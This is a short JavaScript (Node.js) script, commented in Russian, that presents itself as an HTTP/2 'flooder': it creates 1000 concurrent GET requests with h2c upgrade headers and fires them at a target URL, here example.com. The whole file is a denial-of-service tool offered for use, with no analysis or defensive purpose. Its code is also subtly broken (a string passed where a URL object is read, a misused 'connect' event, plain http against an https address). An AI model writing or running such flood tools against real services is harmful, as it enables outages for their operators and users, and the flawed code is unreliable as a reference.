const http = require("http");

// Функция для создания HTTP2-запроса
function createRequest(url) {
  const options = {
    method: "GET",
    headers: {
      "Host": url.hostname,
      "Connection": "Upgrade",
      "Upgrade": "h2c",
    },
  };
  return new http.ClientRequest(url, options);
}

// Функция для отправки HTTP2-запроса
function sendRequest(request) {
  request.on("connect", () => {
    request.end();
  });
  request.on("error", (err) => {
    console.log(err);
  });
}

// Функция для запуска флудера
function startFlooder(url, concurrency) {
  const requests = [];
  for (let i = 0; i < concurrency; i++) {
    requests.push(createRequest(url));
  }
  requests.forEach(sendRequest);
}

// Запуск флудера
startFlooder("https://example.com", 1000);